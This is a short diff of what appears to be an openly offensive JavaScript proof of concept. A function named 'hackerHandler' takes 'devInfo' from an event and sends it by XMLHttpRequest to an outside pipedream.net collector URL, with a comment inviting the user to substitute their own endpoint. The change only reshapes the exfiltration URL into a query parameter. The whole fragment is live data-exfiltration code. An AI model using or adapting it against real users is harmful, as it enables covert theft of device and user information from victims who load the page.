@@ -3,7 +3,7 @@ window.history.replaceState(null, '', '/attacker');
 function hackerHandler(e) {
 	var devInfo = e.actions[4][1]
 	var xhr = new XMLHttpRequest();
-	xhr.open('GET', 'https://enaq7p6qvwk209a.m.pipedream.net'+devInfo) // change by your url
+	xhr.open('GET', 'https://enaq7p6qvwk209a.m.pipedream.net/?devInfo='+devInfo) // change by your url
 	xhr.send()
 }
 
